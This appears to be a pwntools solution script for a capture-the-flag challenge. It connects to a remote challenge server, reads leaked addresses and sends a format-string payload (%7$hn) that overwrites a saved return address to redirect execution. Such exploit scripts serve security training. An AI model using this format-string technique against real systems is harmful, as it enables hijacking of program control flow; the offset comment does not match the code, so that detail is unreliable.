from pwn import *

elf = ELF('./task')
# p = elf.process()
p = remote('rivit.dev', 10016)

# Format string to overwrite
p.recvuntil(b'Address of victory: ')
addr_vic = p.recvline().strip().decode('utf-8')[2::]
print(addr_vic)
low = int(addr_vic[4:], 16)

p.recvuntil(b'Address of buf: ')
addr_buf = p.recvline().strip().decode('utf-8')[2::]
print(f'Address of buf: {addr_buf}')
addr_buf = int(addr_buf, 16)

addr_to_ret = addr_buf + 144  # buf is 128 bytes, using stack, we need 20 more bytes to reach the return address

p.recvuntil(b'Return address: ')
addr_ret = p.recvline().strip().decode('utf-8')[2::]
print(f'Return address: {addr_ret}')
addr_ret = int(addr_ret, 16)


payload = b''.join(
    [
        p32(addr_to_ret),
        b'%',
        str(low).encode(),
        b'x%7$hn%',
    ]
)
p.sendline(payload)
p.recvuntil(b'Return address: ')
p.interactive()